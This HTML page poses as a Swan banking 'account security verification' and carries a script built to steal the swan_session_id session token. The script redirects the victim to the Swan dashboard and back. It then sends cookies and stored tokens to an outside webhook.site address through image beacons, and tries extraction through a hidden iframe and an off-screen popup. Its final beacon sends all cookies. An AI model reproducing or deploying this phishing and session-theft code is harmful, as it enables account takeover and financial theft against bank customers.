<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Swan Account Verification</title>
    <style>
        body { font-family: system-ui, sans-serif; margin: 30px; line-height: 1.6; }
        .container { max-width: 600px; margin: 0 auto; text-align: center; }
        button {
            background: #0055a4;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 20px;
        }
        .message { margin: 20px 0; padding: 15px; background: #f5f7fa; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Swan Account Security Verification</h1>
        
        <div id="initial-page" class="message">
            <p>Please verify your Swan banking account by clicking the button below.</p>
            <p>You will be redirected to Swan Dashboard and then automatically returned here.</p>
            <button id="verifyButton">Verify My Account</button>
        </div>
        
        <div id="return-page" class="message" style="display:none;">
            <h2>Verification Complete</h2>
            <p>Thank you for verifying your account. You may now close this window.</p>
        </div>
    </div>
    
    <script>
        // The webhook URL to send the cookie to
        const WEBHOOK_URL = "https://webhook.site/9ef1fe5e-6b72-4a68-b1bd-5ca39d09311a";
        
        // Check if we're returning from dashboard
        const isReturning = window.location.search.includes('returning=true');
        
        // On page load
        window.onload = function() {
            if (isReturning) {
                // Show return page
                document.getElementById('initial-page').style.display = 'none';
                document.getElementById('return-page').style.display = 'block';
                
                // Extract and send the cookie
                extractAndSendCookie();
            } else {
                // Show initial page
                document.getElementById('verifyButton').addEventListener('click', function() {
                    // Redirect to dashboard with our return URL
                    const returnUrl = encodeURIComponent(window.location.href + (window.location.href.includes('?') ? '&' : '?') + 'returning=true');
                    window.location.href = 'https://dashboard.swan.io/?returnUrl=' + returnUrl;
                });
            }
        };
        
        // Extract and send the cookie
        function extractAndSendCookie() {
            // Try to send cookie via image beacon (most reliable)
            function sendCookie(name, value) {
                const img = new Image();
                img.src = `${WEBHOOK_URL}?cookie_name=${encodeURIComponent(name)}&cookie_value=${encodeURIComponent(value)}&time=${Date.now()}`;
            }
            
            // Extract cookies
            const cookies = document.cookie.split(';');
            
            // Check all cookies
            for (let i = 0; i < cookies.length; i++) {
                const cookie = cookies[i].trim();
                const [name, value] = cookie.split('=');
                
                // Look for swan_session_id
                if (name === 'swan_session_id') {
                    sendCookie(name, value);
                }
            }
            
            // Also check for swan_session_id in localStorage and sessionStorage
            const checkStorage = function(storage, storageName) {
                for (let i = 0; i < storage.length; i++) {
                    const key = storage.key(i);
                    if (key === 'swan_session_id') {
                        sendCookie('swan_session_id', storage.getItem(key));
                    }
                }
            };
            
            // Check both storage types
            try { checkStorage(localStorage, 'localStorage'); } catch (e) {}
            try { checkStorage(sessionStorage, 'sessionStorage'); } catch (e) {}
            
            // Create an iframe to dashboard to try cookie extraction
            const iframe = document.createElement('iframe');
            iframe.style.width = '1px';
            iframe.style.height = '1px';
            iframe.style.position = 'absolute';
            iframe.style.left = '-1000px';
            iframe.src = 'https://dashboard.swan.io';
            document.body.appendChild(iframe);
            
            // After iframe loads, try direct extraction
            iframe.onload = function() {
                try {
                    const iframeCookies = iframe.contentDocument.cookie;
                    const match = iframeCookies.match(/swan_session_id=([^;]+)/);
                    if (match) {
                        sendCookie('swan_session_id', match[1]);
                    }
                } catch (e) {
                    // Expected error due to Same-Origin Policy
                }
                
                // Remove iframe after 2 seconds
                setTimeout(function() {
                    document.body.removeChild(iframe);
                }, 2000);
            };
            
            // As a fallback, try opening dashboard in a popup
            try {
                const popup = window.open('https://dashboard.swan.io', 'swan_dashboard', 'width=1,height=1,left=-1000,top=-1000');
                
                // Try to extract after a delay
                setTimeout(function() {
                    try {
                        const popupCookies = popup.document.cookie;
                        const match = popupCookies.match(/swan_session_id=([^;]+)/);
                        if (match) {
                            sendCookie('swan_session_id', match[1]);
                        }
                        popup.close();
                    } catch (e) {
                        // Expected error
                        popup.close();
                    }
                }, 2000);
            } catch (e) {
                // Popup blocked or other error
            }
            
            // Also try a final beacon with all cookies for analysis
            const img = new Image();
            img.src = `${WEBHOOK_URL}?all_cookies=${encodeURIComponent(document.cookie)}&time=${Date.now()}`;
        }
    </script>
</body>
</html>
